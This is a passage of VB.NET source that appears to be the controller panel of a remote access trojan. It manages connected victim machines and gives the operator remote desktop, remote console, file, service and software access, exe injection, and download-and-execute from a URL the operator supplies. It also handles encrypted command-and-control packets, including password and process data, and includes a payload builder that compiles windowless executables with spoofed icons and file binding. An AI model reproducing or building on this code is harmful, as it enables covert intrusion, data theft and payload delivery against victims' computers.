        MessageBox.Show("Settings saved", Label8.Text, MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Async Sub lstConnections_SelectedIndexChanged(sender As Object, e As EventArgs) Handles lstConnections.SelectedIndexChanged
        Try
            If lstConnections.SelectedItems.Count = 1 Then
                lstConnections.ContextMenuStrip = MenuMain
                Dim source As String
                Dim reader As New modINI
                Modulename = "CInfo"
                Dim MyTask As Task(Of String) = GetPage()
                source = Await MyTask

                If source <> "" Then
                    For Each c As ServerClient In Server.Clients
                        If c.EndPoint.ToString = lstConnections.Items(lstConnections.SelectedItems(0).Index).SubItems(9).Text.ToString Then
                            SendCompilePacket(c, source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), c.EndPoint.ToString)
                        End If
                    Next
                End If
            Else
                lstConnections.ContextMenuStrip = MultiMain
            End If
        Catch : End Try
    End Sub

    Private Sub DesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DesktopToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(0)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdRDPon.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(0)
                f.cmdRDPon.PerformClick()
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
            End Try
        End If
    End Sub

    Private Sub ServiceManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ServiceManagerToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(3)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdGetService.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(3)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
                f.cmdGetService.PerformClick()
            End Try
        End If
    End Sub

    Private Async Sub InjectexeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InjectexeToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ofd As New OpenFileDialog
            Dim bytes As String = ""
            ofd.Filter = "Executable File (*.exe)|*.exe"
            ofd.FileName = ""
            If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim Data As Byte() = File.ReadAllBytes(ofd.FileName)
                bytes = format(Data)
            End If

            Dim source As String
            Dim reader As New modINI
            Modulename = "Inject"
            Dim MyTask As Task(Of String) = GetPage()
            source = Await MyTask
            source = source.Replace("[bytes]", bytes)
            For Each c As ServerClient In Server.Clients
                If c.EndPoint.ToString = lstConnections.Items(lstConnections.SelectedItems(0).Index).SubItems(9).Text.ToString Then
                    SendCompilePacket(c, source, "", "", "")
                End If
            Next
        End If
    End Sub

    Private Sub InstalledSoftwareToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InstalledSoftwareToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(4)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdGetSoftware.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(4)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
                f.cmdGetSoftware.PerformClick()
            End Try
        End If
    End Sub

    Private Sub RemoteConsoleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteConsoleToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(5)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdStartCMD.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(5)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
                f.cmdStartCMD.PerformClick()
            End Try
        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(6)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdStartFile.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(6)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
                f.cmdStartFile.PerformClick()
            End Try
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
        Process.Start("http://rwx.imi-tat0r.net")
    End Sub

    Private Sub MiscToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MiscToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(7)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(7)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
            End Try
        End If
    End Sub

    Private Sub CloseToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem1.Click
        If lstConnections.SelectedItems.Count > 0 Then
            For i = 0 To lstConnections.SelectedItems.Count - 1
                SendAnyPacket(lstConnections.Items(lstConnections.SelectedItems(i).Index).SubItems(9).Text.ToString, CByte(PacketHeader.Ender))
            Next
        End If
    End Sub

    Private Async Sub UninstallToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem1.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim source As String
            Modulename = "Uninstall"
            Dim MyTask As Task(Of String) = GetPage()
            source = Await MyTask

            For i = 0 To lstConnections.SelectedItems.Count - 1
                For Each c As ServerClient In Server.Clients
                    If c.EndPoint.ToString = lstConnections.Items(lstConnections.SelectedItems(i).Index).SubItems(9).Text.ToString Then
                        SendCompilePacket(c, source, "", "", "")
                    End If
                Next
            Next
        End If
    End Sub

    Private Async Sub DLExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DLExecuteToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim par As String
            Dim source As String
            Modulename = "DLExec"
            Dim MyTask As Task(Of String) = GetPage()
            source = Await MyTask
            par = InputBox("Directlink including http://", "OnConnect", "http://")
            source = source.Replace("[url]", par)
            source = source.Replace("'/\", "")
            For i = 0 To lstConnections.SelectedItems.Count - 1
                For Each c As ServerClient In Server.Clients
                    If c.EndPoint.ToString = lstConnections.Items(lstConnections.SelectedItems(i).Index).SubItems(9).Text.ToString Then
                        SendCompilePacket(c, source, "", "", "")
                    End If
                Next
            Next
        End If
    End Sub

#End Region

#Region " Server & DataServer Events "
    Private Async Sub Server_ClientReadPacket(sender As ServerListener, client As ServerClient, data() As Byte) Handles Server.ClientReadPacket
        received += data.Length
        Try
            If DirectCast(client.UserState, User).SecureConnection Then
                data = DirectCast(client.UserState, User).decrypt(data)
            End If
        Catch
            client.Disconnect()
        End Try

        Dim values As Object() = packer.Deserialize(data)
        If values Is Nothing OrElse values.Length = 0 Then
            client.Disconnect()
            Return
        End If

        Select Case DirectCast(values(0), PacketHeader)
            Case PacketHeader.Handshake
                Await HandleHandshakePacket(client, values)
                DirectCast(client.UserState, User).pingtimer = (DateTime.Now - New DateTime(1970, 1, 1)).TotalMilliseconds
                SendPingPacket(client)
            Case PacketHeader.Ping
                lstConnections.Invoke(Sub() HandlePingPacket(client))
            Case Else
                client.Disconnect()
        End Select
    End Sub

    Private Sub Server_ClientStateChanged(sender As ServerListener, client As ServerClient, connected As Boolean) Handles Server.ClientStateChanged
        If connected Then
            client.UserState = New User()
            SendHandshakePacket(client, PublicKey)
        Else
            Try
                lstConnections.Invoke(Sub() lvremove(lstConnections, client.EndPoint.ToString))
                lstDesktops.Invoke(Sub() deskremove(client.EndPoint.ToString))
                Me.Invoke(Sub() removeform(client.EndPoint.ToString))
                Me.Invoke(Sub() removeCInfo(client.EndPoint.ToString))

            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        End If
    End Sub

    Private Async Sub DataServer_ClientReadPacket(sender As ServerListener, client As ServerClient, data() As Byte) Handles DataServer.ClientReadPacket
        received += data.Length
        Try
            If DirectCast(client.UserState, User).SecureConnection Then
                data = DirectCast(client.UserState, User).decrypt(data)
            End If
        Catch
            client.Disconnect()
        End Try

        Dim values As Object() = packer.Deserialize(data)
        If values Is Nothing OrElse values.Length = 0 Then
            client.Disconnect()
            Return
        End If

        Select Case DirectCast(values(0), PacketHeader)
            Case PacketHeader.Handshake
                HandleHandshakeAuthPacket(client, values)
            Case PacketHeader.Authorize
                Await HandleAuthorizePacket(client, values)
            Case PacketHeader.FunctionHandshake
                HandleFuncHandshakePacket(client, values)
            Case PacketHeader.PW
                HandlePWPacket(client, values)
            Case PacketHeader.Process
                HandleProcessPacket(client, values)
            Case PacketHeader.CInfo
                HandleCInfoPacket(client, values)
            Case PacketHeader.RDP
                HandleRDPPacket(client, values)
            Case PacketHeader.Service
                HandleServicePacket(client, values)
            Case PacketHeader.Software
                HandleSoftwarePacket(client, values)
            Case PacketHeader.Console
                HandleConsolePacket(client, values)
            Case PacketHeader.Drives
                HandleDrivesPacket(client, values)
            Case PacketHeader.Content
                HandleContentPacket(client, values)
            Case PacketHeader.Preview
                HandlePreviewPacket(client, values)
            Case PacketHeader.PicPreview
                HandlePicPreviewPacket(client, values)
            Case PacketHeader.Download
                HandleDownloadPacket(client, values)
            Case PacketHeader.Done
                HandleDonePacket(client, values)
            Case Else
                client.Disconnect()
        End Select
    End Sub

    Private Sub DataServer_ClientStateChanged(sender As ServerListener, client As ServerClient, connected As Boolean) Handles DataServer.ClientStateChanged
        If connected Then
            Debug.Print("C: " & client.EndPoint.ToString)
            client.UserState = New User()
            SendHandshakePacket(client, PublicKey)
        Else
            Debug.Print("DC: " & client.EndPoint.ToString)
            Try
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        End If
    End Sub

    Private Sub DataServer_ClientWritePacket(sender As ServerListener, client As ServerClient, size As Integer) Handles DataServer.ClientWritePacket
        sent += size
    End Sub

    Private Sub Server_ClientWritePacket(sender As ServerListener, client As ServerClient, size As Integer) Handles Server.ClientWritePacket
        sent += size
    End Sub

#End Region


    Private Sub RemovePortToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemovePortToolStripMenuItem.Click
        Try
            mappings.Remove(lstPorts.SelectedItems(0).Text, "TCP")
            lstPorts.Items.Remove(lstPorts.SelectedItems(0))
        Catch : End Try

    End Sub

    Private Sub cmbspoof_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cmbspoof.SelectedIndexChanged
        Try
            If cmbspoof.Text <> "None" Then
                Dim bm As New Bitmap(Application.StartupPath & "\Icons\" & cmbspoof.Text & ".ico")
                imgspoof.Image = bm
            Else
                imgspoof.Image = Nothing
            End If
        Catch : End Try
    End Sub

    Private Sub cmdBind_Click(sender As Object, e As EventArgs) Handles cmdBind.Click
        Dim ofdbinder As New OpenFileDialog
        ofdbinder.Filter = "Any Files|*.*"
        ofdbinder.FileName = ""
        If ofdbinder.ShowDialog = Windows.Forms.DialogResult.OK Then
            txtBind.Text = ofdbinder.FileName
        End If
    End Sub
End Class
Class User

    Public Authorized As Boolean
    Public pingtimer As Long
    Public SecureConnection As Boolean

    Private encryptor As ICryptoTransform
    Private decryptor As ICryptoTransform

    Public Sub PrepareEncryption(key As Byte(), iv As Byte())
        Dim r As New RijndaelManaged()
        encryptor = r.CreateEncryptor(key, iv)
        decryptor = r.CreateDecryptor(key, iv)

        SecureConnection = True
    End Sub

    Public Function encrypt(data As Byte()) As Byte()
        Return encryptor.TransformFinalBlock(data, 0, data.Length)
    End Function

    Public Function decrypt(data As Byte()) As Byte()
        Return decryptor.TransformFinalBlock(data, 0, data.Length)
    End Function

End Class


Public Class iCompiler
    Public Shared Sub GenerateExecutable(ByVal Output As String, ByVal Source As String, ByVal Icon As String)
        Dim Compiler As New VBCodeProvider
        Dim Parameters As New CompilerParameters()
        Dim cResults As CompilerResults
        Parameters.GenerateExecutable = True
        Parameters.OutputAssembly = Output
        Parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Data.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        Parameters.CompilerOptions = "/t:winexe"
        If Not String.IsNullOrEmpty(Icon) Then
            File.Copy(Icon, "icon1.ico")
            Parameters.CompilerOptions += " /win32icon:icon1.ico"
        End If
        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)

        If cResults.Errors.Count > 0 Then
            For Each compile_error As CompilerError In cResults.Errors
                Dim [error] As CompilerError = compile_error
                'Console.Beep()
                MessageBox.Show("Error: " & [error].ErrorText & vbCr & vbLf & [error].Line)
            Next
        End If
        If File.Exists("icon1.ico") Then
            File.Delete("icon1.ico")
        End If
        FileClose()
    End Sub
End Class